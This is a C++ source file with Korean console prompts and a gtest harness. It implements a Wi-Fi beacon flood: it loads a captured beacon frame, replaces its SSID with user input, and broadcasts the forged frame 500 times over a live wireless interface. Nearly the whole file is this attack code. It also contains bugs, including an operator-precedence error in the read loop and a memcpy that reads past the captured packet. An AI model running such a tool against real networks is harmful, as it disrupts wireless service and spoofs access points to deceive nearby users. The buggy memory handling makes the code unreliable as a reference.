#include "pch.h"
#include <gtest/gtest.h>
#include <cstring>
#include <unistd.h>
void beaconFlood(std::string interface_name, std::string file_name){
    pcap_t* pcap_descripter = nullptr;
    pcap_t* send_pcap_descripter = nullptr;
    char errbuf[PCAP_ERRBUF_SIZE] = {0, };
    pcap_descripter = pcap_open_offline(file_name.c_str(), errbuf);
    send_pcap_descripter = pcap_open_live(interface_name.c_str(), BUFSIZ, 1, 1000, errbuf);
    if(!pcap_descripter || !send_pcap_descripter){
        puts("pcap_open_live Error");
        HANDLE_ERROR_RETURN("beaconFlood", errbuf);
    }
    
    const unsigned char* packet;
    const unsigned char* beacon_frame_start_point;
    const unsigned char* ssid_start_point;
    struct pcap_pkthdr* packet_info;
    int i, res;
    int ssid_len;
    std::string inputed_name;
    std::string caputre_ssid = "SSU328";
    struct Packet{
        size_t _size;
        unsigned char * _start;
        //Packet(){};
        unsigned char * getAddress(int index){
            return _start + index;
        }
        ~Packet(){
            free(_start);
        }
    };

    while(res = pcap_next_ex(pcap_descripter, &packet_info, &packet)>=0){
        if(res == 0)
            break;

        std::cout<<"ssid이름입력해주세요:";
        std::cin>>inputed_name;
        
        uint16_t radiotap_header_len = (uint16_t) *(packet+2);
        int ssid_len_index = radiotap_header_len + 24 + 12 + 1;
        ssid_len = *(unsigned char *)(packet + ssid_len_index);

        Packet des;
        des._size = (sizeof(char)*packet_info->caplen) + (inputed_name.length() - ssid_len);
        des._start = (unsigned char *)malloc(des._size);
        memcpy((unsigned char *)des._start, (unsigned char *)packet, packet_info->caplen + 24 + 12 + 1);
        for(int i = 3; i<radiotap_header_len; i++)
            des._start[i] = 0x00;
        *(des.getAddress(ssid_len_index)) = inputed_name.length();
        memcpy(des.getAddress(ssid_len_index+1), inputed_name.c_str(), inputed_name.size());
        memcpy(des.getAddress(ssid_len_index+1+inputed_name.size()), packet+ssid_len_index+1+ssid_len, packet_info->caplen - (ssid_len_index + 1 + ssid_len));

        
        for(int i = 0; i<des._size; i++){
            printf("%02x ", des._start[i]);
            if((i+1)%16 == 0)
                printf("\n");
        }        

        for(int i = 0; i<500; i++){
            if(pcap_sendpacket(send_pcap_descripter, des._start, des._size) == -1){
                HANDLE_ERROR_RETURN("beaconflood", errbuf);
            }

            std::cout<<i<<"패킷을 보냅니다"<<std::endl;
            usleep(100000);
        }
    }
}
#ifdef UNIT_TEST
TEST(BeaconFloodTest, HandlesValidInput) {
    beaconFlood(std::string("wlan0"), std::string("80211packet_iptimeN150UA2.pcapng"));
}

int main(int argc, char **argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
#endif